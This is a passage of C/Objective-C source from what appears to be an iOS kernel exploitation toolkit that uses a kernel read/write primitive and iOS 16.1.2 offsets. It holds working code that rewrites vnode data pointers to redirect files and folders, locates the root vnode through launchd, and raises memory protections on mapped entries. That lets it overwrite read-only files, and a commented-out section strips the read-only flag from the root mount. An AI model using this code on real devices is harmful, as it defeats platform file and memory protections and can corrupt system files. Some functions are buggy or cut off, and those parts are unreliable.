//        kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
//        kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
//        kwrite64(kfd, to_vnode + 0x30, from_v_ncchildren_tqh_first);
//        kwrite64(kfd, to_vnode + 0x38, from_v_ncchildren_tqh_last);
//        kwrite64(kfd, to_vnode + 0x40, from_v_nclinks_lh_first);
    
    
//    //v_data = (struct apfs_fsnode, closed-source...)
//    //    from_file_index_vnode = kread64(kfd, from_v_data + 32);
//    printf("[i] vnode, %s from_vnode->v_data->fd_vnode: 0x%llx\n", from, from_file_index_vnode);// <- vnode

    return 0;
}

uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    uint32_t off_vnode_v_mount = 0xd8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_vnode_v_kusecount = 0x5c;
    uint32_t off_vnode_v_references = 0x5b;
    uint32_t off_vnode_v_parent = 0xc0;
    uint32_t off_vnode_v_label = 0xe8;
    uint32_t off_vnode_v_cred = 0x98;
    uint32_t off_mount_mnt_fsowner = 0x9c0;
    uint32_t off_mount_mnt_fsgroup = 0x9c4;

    int file_index = open(to, O_RDONLY);
    if (file_index == -1) return -1;

    uint64_t proc = getProc(kfd, getpid());

    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;

    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);

    close(file_index);

    file_index = open(from, O_RDONLY);
    if (file_index == -1) return -1;

    filedesc_pac = kread64(kfd, proc + off_p_pfd);
    filedesc = filedesc_pac | 0xffffff8000000000;
    openedfile = kread64(kfd, filedesc + (8 * file_index));
    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    fileglob = fileglob_pac | 0xffffff8000000000;
    vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);

    close(file_index);

    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);

    return 0;
}

uint64_t funVnodeResearch(u64 kfd, char* to, char* from) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    uint32_t off_vnode_v_name = 0xb8;
    uint32_t off_vnode_v_mount = 0xd8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_vnode_v_kusecount = 0x5c;
    uint32_t off_vnode_v_references = 0x5b;
    uint32_t off_vnode_v_parent = 0xc0;
    uint32_t off_vnode_v_label = 0xe8;
    uint32_t off_vnode_v_cred = 0x98;
    uint32_t off_vnode_vu_mountedhere = 0x68;
    uint32_t off_vnode_vu_socket = 0x70;
    uint32_t off_vnode_vu_specinfo = 0x78;
    uint32_t off_vnode_vu_fifoinfo = 0x80;
    uint32_t off_vnode_vu_ubcinfo = 0x88;
    uint32_t off_mount_mnt_data = 0x11F;
    uint32_t off_mount_mnt_fsowner = 0x9c0;
    uint32_t off_mount_mnt_fsgroup = 0x9c4;
    uint32_t off_mount_mnt_devvp = 0x980;
    uint32_t off_specinfo_si_flags = 0x10;
    
    int file_index = open(to, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
    
    uint64_t to_v_mount_pac = kread64(kfd, to_vnode + off_vnode_v_mount);
    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_mount: 0x%llx\n", to, to_v_mount);
    uint64_t to_v_data = kread64(kfd, to_vnode + off_vnode_v_data);
    printf("[i] %s to_vnode->v_data: 0x%llx\n", from, to_v_data);
    uint64_t to_v_label = kread64(kfd, to_vnode + off_vnode_v_label);
    printf("[i] %s to_vnode->v_label: 0x%llx\n", to, to_v_label);
    
    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
    printf("[i] %s to_vnode->v_references: %d\n", to, to_v_references);
    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
    printf("[i] %s to_vnode->usecount: %d\n", to, to_usecount);
    uint32_t to_iocount = kread32(kfd, to_vnode + off_vnode_iocount);
    printf("[i] %s to_vnode->iocount: %d\n", to, to_iocount);
    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
    printf("[i] %s to_vnode->kusecount: %d\n", to, to_v_kusecount);
    uint64_t to_v_parent_pac = kread64(kfd, to_vnode + off_vnode_v_parent);
    uint64_t to_v_parent = to_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_parent: 0x%llx\n", to, to_v_parent);
    uint64_t to_v_freelist_tqe_next = kread64(kfd, to_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s to_vnode->v_freelist.tqe_next: 0x%llx\n", to, to_v_freelist_tqe_next);
    uint64_t to_v_freelist_tqe_prev = kread64(kfd, to_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s to_vnode->v_freelist.tqe_prev: 0x%llx\n", to, to_v_freelist_tqe_prev);
    uint64_t to_v_mntvnodes_tqe_next = kread64(kfd, to_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s to_vnode->v_mntvnodes.tqe_next: 0x%llx\n", to, to_v_mntvnodes_tqe_next);
    uint64_t to_v_mntvnodes_tqe_prev = kread64(kfd, to_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s to_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", to, to_v_mntvnodes_tqe_prev);
    uint64_t to_v_ncchildren_tqh_first = kread64(kfd, to_vnode + 0x30);
    printf("[i] %s to_vnode->v_ncchildren.tqh_first: 0x%llx\n", to, to_v_ncchildren_tqh_first);
    uint64_t to_v_ncchildren_tqh_last = kread64(kfd, to_vnode + 0x38);
    printf("[i] %s to_vnode->v_ncchildren.tqh_last: 0x%llx\n", to, to_v_ncchildren_tqh_last);
    uint64_t to_v_nclinks_lh_first = kread64(kfd, to_vnode + 0x40);
    printf("[i] %s to_vnode->v_nclinks.lh_first: 0x%llx\n", to, to_v_nclinks_lh_first);
    uint64_t to_v_defer_reclaimlist = kread64(kfd, to_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s to_vnode->v_defer_reclaimlist: 0x%llx\n", to, to_v_defer_reclaimlist);
    uint32_t to_v_listflag = kread32(kfd, to_vnode + 0x50);    //v_listflag
    printf("[i] %s to_vnode->v_listflag: 0x%x\n", to, to_v_listflag);
    uint64_t to_v_cred_pac = kread64(kfd, to_vnode + off_vnode_v_cred);
    uint64_t to_v_cred = to_v_cred_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_cred: 0x%llx\n", to, to_v_cred);
    
    uint64_t to_devvp = kread64(kfd, to_v_mount + off_mount_mnt_devvp);
    printf("[i] %s to_vnode->v_mount->mnt_devvp: 0x%llx\n", to, to_devvp);
    uint64_t to_devvp_nameptr = kread64(kfd, to_devvp + off_vnode_v_name);
    uint64_t to_devvp_name = kread64(kfd, to_devvp_nameptr);
    printf("[i] %s to_vnode->v_mount->mnt_devvp->v_name: %s\n", to, &to_devvp_name);
    uint64_t to_devvp_vu_specinfo_pac = kread64(kfd, to_devvp + off_vnode_vu_specinfo);
    uint64_t to_devvp_vu_specinfo = to_devvp_vu_specinfo_pac | 0xffffff8000000000;
    printf("[i] %s to_devvp->vu_specinfo: 0x%llx\n", to, to_devvp_vu_specinfo);
    uint32_t to_devvp_vu_specinfo_si_flags = kread32(kfd, to_devvp_vu_specinfo + off_specinfo_si_flags);
    printf("[i] %s to_devvp->vu_specinfo->si_flags: 0x%x\n", to, to_devvp_vu_specinfo_si_flags);
    
    close(file_index);
    
    file_index = open(from, O_RDONLY);
    if (file_index == -1) return -1;
    
    //get vnode
    filedesc_pac = kread64(kfd, proc + off_p_pfd);
    filedesc = filedesc_pac | 0xffffff8000000000;
    openedfile = kread64(kfd, filedesc + (8 * file_index));
    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    fileglob = fileglob_pac | 0xffffff8000000000;
    vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
    
    close(file_index);
    
    uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
    uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_mount: 0x%llx\n", from, from_v_mount);
    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
    printf("[i] %s from_vnode->v_data: 0x%llx\n", from, from_v_data);
    uint64_t from_v_label = kread64(kfd, from_vnode + off_vnode_v_label);
    printf("[i] %s from_vnode->v_label: 0x%llx\n", from, from_v_label);
    uint8_t from_v_references = kread8(kfd, from_vnode + off_vnode_v_references);
    printf("[i] %s from_vnode->v_references: %d\n", from, from_v_references);
    uint32_t from_usecount = kread32(kfd, from_vnode + off_vnode_usecount);
    printf("[i] %s from_vnode->usecount: %d\n", from, from_usecount);
    uint32_t from_iocount = kread32(kfd, from_vnode + off_vnode_iocount);
    printf("[i] %s from_vnode->iocount: %d\n", from, from_iocount);
    uint32_t from_v_kusecount = kread32(kfd, from_vnode + off_vnode_v_kusecount);
    printf("[i] %s from_vnode->kusecount: %d\n", from, from_v_kusecount);
    uint64_t from_v_parent_pac = kread64(kfd, from_vnode + off_vnode_v_parent);
    uint64_t from_v_parent = from_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_parent: 0x%llx\n", from, from_v_parent);
    uint64_t from_v_freelist_tqe_next = kread64(kfd, from_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s from_vnode->v_freelist.tqe_next: 0x%llx\n", from, from_v_freelist_tqe_next);
    uint64_t from_v_freelist_tqe_prev = kread64(kfd, from_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s from_vnode->v_freelist.tqe_prev: 0x%llx\n", from, from_v_freelist_tqe_prev);
    uint64_t from_v_mntvnodes_tqe_next = kread64(kfd, from_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s from_vnode->v_mntvnodes.tqe_next: 0x%llx\n", from, from_v_mntvnodes_tqe_next);
    uint64_t from_v_mntvnodes_tqe_prev = kread64(kfd, from_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s from_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", from, from_v_mntvnodes_tqe_prev);
    uint64_t from_v_ncchildren_tqh_first = kread64(kfd, from_vnode + 0x30);
    printf("[i] %s from_vnode->v_ncchildren.tqh_first: 0x%llx\n", from, from_v_ncchildren_tqh_first);
    uint64_t from_v_ncchildren_tqh_last = kread64(kfd, from_vnode + 0x38);
    printf("[i] %s from_vnode->v_ncchildren.tqh_last: 0x%llx\n", from, from_v_ncchildren_tqh_last);
    uint64_t from_v_nclinks_lh_first = kread64(kfd, from_vnode + 0x40);
    printf("[i] %s from_vnode->v_nclinks.lh_first: 0x%llx\n", from, from_v_nclinks_lh_first);
    uint64_t from_v_defer_reclaimlist = kread64(kfd, from_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s from_vnode->v_defer_reclaimlist: 0x%llx\n", from, from_v_defer_reclaimlist);
    uint32_t from_v_listflag = kread32(kfd, from_vnode + 0x50);    //v_listflag
    printf("[i] %s from_vnode->v_listflag: 0x%x\n", from, from_v_listflag);
    uint64_t from_v_cred_pac = kread64(kfd, from_vnode + off_vnode_v_cred);
    uint64_t from_v_cred = from_v_cred_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_cred: 0x%llx\n", from, from_v_cred);
    
    uint64_t from_devvp = kread64(kfd, from_v_mount + off_mount_mnt_devvp);
    printf("[i] %s from_vnode->v_mount->mnt_devvp: 0x%llx\n", from, from_devvp);
    uint64_t from_devvp_nameptr = kread64(kfd, from_devvp + off_vnode_v_name);
    uint64_t from_devvp_name = kread64(kfd, from_devvp_nameptr);
    printf("[i] %s from_vnode->v_mount->mnt_devvp->v_name: %s\n", from, &from_devvp_name);
    uint64_t from_devvp_vu_specinfo_pac = kread64(kfd, from_devvp + off_vnode_vu_specinfo);
    uint64_t from_devvp_vu_specinfo = from_devvp_vu_specinfo_pac | 0xffffff8000000000;
    printf("[i] %s from_devvp->vu_specinfo: 0x%llx\n", from, from_devvp_vu_specinfo);
    uint32_t from_devvp_vu_specinfo_si_flags = kread32(kfd, from_devvp_vu_specinfo + off_specinfo_si_flags);
    printf("[i] %s from_devvp->vu_specinfo->si_flags: 0x%x\n", from, from_devvp_vu_specinfo_si_flags);
    
    
    //Get Parent until "mobile. "/var/mobile"
    uint64_t from_vnode_parent = kread64(kfd, from_vnode + off_vnode_v_parent) | 0xffffff8000000000;
    uint64_t from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
    uint64_t from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    for (int i; i<4; i++) {
        from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
        from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
        from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
        printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    }
//    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
//    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
//    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
//    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
//
//    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
//    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
//    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
//    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
//
//    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
//    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
//    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
//    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
//
//    from_vnode_parent = kread64(kfd, from_vnode_parent + off_vnode_v_parent) | 0xffffff8000000000;
//    from_vnode_parent_nameptr = kread64(kfd, from_vnode_parent + off_vnode_v_name);
//    from_vnode_parent_name = kread64(kfd, from_vnode_parent_nameptr);
//    printf("[i] %s from_vnode_parent->v_name: %s\n", from, &from_vnode_parent_name);
    
    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
    
    kwrite64(kfd, to_vnode + off_vnode_v_data, kread64(kfd, from_vnode_parent + off_vnode_v_data));
    
//#define VFMLINKTARGET  0x20000000
//    kwrite32(kfd, from_vnode + off_vnode_vflags, kread32(kfd, from_vnode + off_vnode_vflags) & VFMLINKTARGET);
//
//    kwrite32(kfd, from_devvp_vu_specinfo + off_specinfo_si_flags, 0x0);
//    kwrite32(kfd, to_devvp_vu_specinfo + off_specinfo_si_flags, 0x0);
    
//    kwrite64(kfd, to_v_mount + off_mount_mnt_devvp, from_devvp);
//    kwrite64(kfd, to_v_mount + off_mount_mnt_data, kread64(kfd, from_v_mount + off_mount_mnt_data));
    
//    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
//    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
//    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
//    kwrite64(kfd, to_vnode + off_vnode_v_data, kread64(kfd, to_devvp + off_vnode_v_data));
//
//    close(file_index);
    
//    sleep(2);
    
    return 0;
}

uint64_t findRootVnode(u64 kfd) {
    uint32_t off_p_textvp = 0x350;
    uint32_t off_vnode_v_name = 0xb8;
    uint32_t off_vnode_v_parent = 0xc0;

    uint64_t launchd_proc = getProc(kfd, 1);

    uint64_t textvp_pac = kread64(kfd, launchd_proc + off_p_textvp);
    uint64_t textvp = textvp_pac | 0xffffff8000000000;
    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);

    uint64_t textvp_nameptr = kread64(kfd, textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(kfd, textvp_nameptr);
    printf("[i] launchd proc->textvp->v_name: %s\n", &textvp_name);

    uint64_t sbin_vnode = kread64(kfd, textvp + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(kfd, sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(kfd, textvp_nameptr);
    printf("[i] launchd proc->textvp->v_parent->v_name: %s\n", &textvp_name);

    uint64_t root_vnode = kread64(kfd, sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(kfd, root_vnode + off_vnode_v_name);
    textvp_name = kread64(kfd, textvp_nameptr);
    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s\n", &textvp_name);

    return root_vnode;
}

enum vtype    { VNON, VREG, VDIR, VBLK, VCHR, VLNK, VSOCK, VFIFO, VBAD, VSTR,
              VCPLX };

#define FLAGS_PROT_SHIFT    7
#define FLAGS_MAXPROT_SHIFT 11
//#define FLAGS_PROT_MASK     0xF << FLAGS_PROT_SHIFT
//#define FLAGS_MAXPROT_MASK  0xF << FLAGS_MAXPROT_SHIFT
#define FLAGS_PROT_MASK    0x780
#define FLAGS_MAXPROT_MASK 0x7800
uint64_t getTask(u64 kfd, char* process) {
    uint64_t proc = getProc(kfd, getpid());
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
    return pr_task;
}

uint64_t kread_ptr(uint64_t kfd, uint64_t kaddr) {
    uint64_t ptr = kread64(kfd, kaddr);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }

    return ptr;
}

void kreadbuf(uint64_t kfd, uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(kfd, curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

uint64_t vm_map_get_header(uint64_t vm_map_ptr)
{
    return vm_map_ptr + 0x10;
}

uint64_t vm_map_header_get_first_entry(uint64_t kfd, uint64_t vm_header_ptr)
{
    return kread_ptr(kfd, vm_header_ptr + 0x8);
}

uint64_t vm_map_entry_get_next_entry(uint64_t kfd, uint64_t vm_entry_ptr)
{
    return kread_ptr(kfd, vm_entry_ptr + 0x8);
}


uint32_t vm_header_get_nentries(uint64_t kfd, uint64_t vm_header_ptr)
{
    return kread32(kfd, vm_header_ptr + 0x20);
}

void vm_entry_get_range(uint64_t kfd, uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
{
    uint64_t range[2];
    kreadbuf(kfd, vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}


//void vm_map_iterate_entries(uint64_t kfd, uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
void vm_map_iterate_entries(uint64_t kfd, uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
{
    uint64_t header = vm_map_get_header(vm_map_ptr);
    uint64_t entry = vm_map_header_get_first_entry(kfd, header);
    uint64_t numEntries = vm_header_get_nentries(kfd, header);

    while (entry != 0 && numEntries > 0) {
        uint64_t start = 0, end = 0;
        vm_entry_get_range(kfd, entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(kfd, entry);
        numEntries--;
    }
}

uint64_t vm_map_find_entry(uint64_t kfd, uint64_t vm_map_ptr, uint64_t address)
{
    __block uint64_t found_entry = 0;
        vm_map_iterate_entries(kfd, vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
            if (address >= start && address < end) {
                found_entry = entry;
                *stop = YES;
            }
        });
        return found_entry;
}

void vm_map_entry_set_prot(uint64_t kfd, uint64_t entry_ptr, vm_prot_t prot, vm_prot_t max_prot)
{
    uint64_t flags = kread64(kfd, entry_ptr + 0x48);
    uint64_t new_flags = flags;
    new_flags = (new_flags & ~FLAGS_PROT_MASK) | ((uint64_t)prot << FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~FLAGS_MAXPROT_MASK) | ((uint64_t)max_prot << FLAGS_MAXPROT_SHIFT);
    if (new_flags != flags) {
        kwrite64(kfd, entry_ptr + 0x48, new_flags);
    }
}

uint64_t start = 0, end = 0;

uint64_t task_get_vm_map(uint64_t kfd, uint64_t task_ptr)
{
    return kread_ptr(kfd, task_ptr + 0x28);
}
#pragma mark overwrite2
uint64_t funVnodeOverwrite2(u64 kfd, char* tofile, char* fromfile) {
    printf("attempting opa's method\n");
    int to_file_index = open(tofile, O_RDONLY);
    printf("to_file_index is %d\n", to_file_index);
    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
    //mmap as read only
    printf("mmap as readonly\n");
    char* to_file_data = mmap(NULL, to_file_size, PROT_READ, MAP_SHARED, to_file_index, 0);
    if (to_file_data == MAP_FAILED) {
        printf("[-] Failed mmap (to_mapped)\n");;
        close(to_file_index);
        return -1;
    }
    close(to_file_index);
//    if (to_file_index < 0) {
//        return 0;
//    }
    
    int from_file_index = open(fromfile, O_RDONLY);
    printf("from_file index is %d\n", from_file_index);
    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
    char* from_file_data = mmap(NULL, from_file_size, PROT_READ, MAP_SHARED, from_file_index, 0); // trouble code, always fails
    if (from_file_data == MAP_FAILED) {
        printf("[-] Failed mmap (from_mapped)\n\n");;
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    close(from_file_index);

    if(to_file_size < from_file_size) {
        printf("[-] File is too big to overwrite!\n\n");
        close(from_file_index);
        close(to_file_index);
        return -1;
    }
    
    // set prot to re-
    printf("task_get_vm_map -> vm ptr\n");
    uint64_t vm_ptr = task_get_vm_map(kfd, getTask(kfd, kfd));
    uint64_t entry_ptr = vm_map_find_entry(kfd, vm_ptr, (uint64_t)to_file_data);
    printf("set prot to rw-\n");
    vm_map_entry_set_prot(kfd, entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE); // now mmap of this to_file_data is read and write! so use this in memcpy.
    
    // WRITE
//    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
//
//    size_t data_len = strlen(data);
//    off_t file_size = lseek(to_file_index, 0, SEEK_END);
    
    
    
    memcpy(to_file_data, from_file_data, from_file_size);
    printf("[overwrite] done\n");
    // Cleanup
    munmap(to_file_data, to_file_size);
    munmap(from_file_data, from_file_size);
//    close(to_file_index);
//    munmap(from_file_data, from_file_size);
//    close(from_file_index);

    // Return success or error code
    return 0;
}
//uint64_t funVnodeResearch2(u64 kfd, char* tofile, char* fromfile) {
//    //16.1.2 offsets
////    uint32_t off_p_pfd = 0xf8;
////    uint32_t off_fd_ofiles = 0;
////    uint32_t off_fp_fglob = 0x10;
////    uint32_t off_fg_data = 0x38;
////    uint32_t off_vnode_iocount = 0x64;
////    uint32_t off_vnode_usecount = 0x60;
////    uint32_t off_vnode_vflags = 0x54;
////    uint32_t off_vnode_v_name = 0xb8;
////    uint32_t off_vnode_v_mount = 0xd8;
////    uint32_t off_vnode_v_data = 0xe0;
////    uint32_t off_vnode_v_kusecount = 0x5c;
////    uint32_t off_vnode_v_references = 0x5b;
////    uint32_t off_vnode_v_parent = 0xc0;
////    uint32_t off_vnode_v_label = 0xe8;
////    uint32_t off_vnode_v_cred = 0x98;
////    uint32_t off_vnode_vu_mountedhere = 0x68;
////    uint32_t off_vnode_vu_socket = 0x70;
////    uint32_t off_vnode_vu_specinfo = 0x78;
////    uint32_t off_vnode_vu_fifoinfo = 0x80;
////    uint32_t off_vnode_vu_ubcinfo = 0x88;
////    uint32_t off_vnode_v_writecount = 0xb0;
////    uint32_t off_vnode_v_type = 0x70;
////    uint32_t off_mount_mnt_data = 0x11F;
////    uint32_t off_mount_mnt_fsowner = 0x9c0;
////    uint32_t off_mount_mnt_fsgroup = 0x9c4;
////    uint32_t off_mount_mnt_devvp = 0x980;
////    uint32_t off_specinfo_si_flags = 0x10;
////    uint32_t off_fg_flag = 0x10;
//
//    uint32_t off_p_pfd = 0xf8;
//    uint32_t off_fd_ofiles = 0;
//    uint32_t off_fp_fglob = 0x10;
//    uint32_t off_fg_data = 0x38;
//    uint32_t off_vnode_iocount = 0x64;
//    uint32_t off_vnode_usecount = 0x60;
//    uint32_t off_vnode_vflags = 0x54;
//    uint32_t off_vnode_v_name = 0xb8;
//    uint32_t off_vnode_v_mount = 0xd8;
//    uint32_t off_vnode_v_data = 0xe0;
//    uint32_t off_vnode_v_kusecount = 0x5c;
//    uint32_t off_vnode_v_references = 0x5b;
//    uint32_t off_vnode_v_parent = 0xc0;
//    uint32_t off_vnode_v_label = 0xe8;
//    uint32_t off_vnode_v_cred = 0x98;
//    uint32_t off_vnode_vu_mountedhere = 0x68;
//    uint32_t off_vnode_vu_socket = 0x70;
//    uint32_t off_vnode_vu_specinfo = 0x78;
//    uint32_t off_vnode_vu_fifoinfo = 0x80;
//    uint32_t off_vnode_vu_ubcinfo = 0x88;
//    uint32_t off_mount_mnt_data = 0x11F;
//    uint32_t off_mount_mnt_fsowner = 0x9c0;
//    uint32_t off_mount_mnt_fsgroup = 0x9c4;
//    uint32_t off_mount_mnt_devvp = 0x980;
//    uint32_t off_specinfo_si_flags = 0x10;
//
//// broken offsets
//    uint32_t off_vnode_v_writecount = 0x60; // 1
//    uint32_t off_vnode_v_type = 0x70; // 2
//    uint32_t off_fg_flag = 0x10; // 3
//
//
//    int file_index = open(tofile, O_RDONLY);
//
//    if (file_index == -1) return -1;
//
//        uint64_t proc = getProc(kfd, getpid());
//
//        //get vnode
//        uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
//        uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
//        uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
//        uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
//        uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
//        uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
//        uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
//        printf("[i] %s to_vnode: 0x%llx\n", tofile, to_vnode);
//
//        uint16_t to_vnode_vtype = kread16(kfd, to_vnode + off_vnode_v_type);
//        printf("[i] %s to_vnode->vtype: 0x%x\n", tofile, to_vnode_vtype);
//
//        uint64_t to_v_mount_pac = kread64(kfd, findRootVnode(kfd) + off_vnode_v_mount);
//        uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
//
//        uint32_t to_m_flag = kread32(kfd, to_v_mount + 0x70);
//
//    #define MNT_RDONLY      0x00000001      /* read only filesystem */
//        kwrite32(kfd, to_v_mount + 0x70, to_m_flag & ~MNT_RDONLY);
//    //    kwrite16(kfd, to_v_mount + off_vnode_v_type, VNON);
//
//
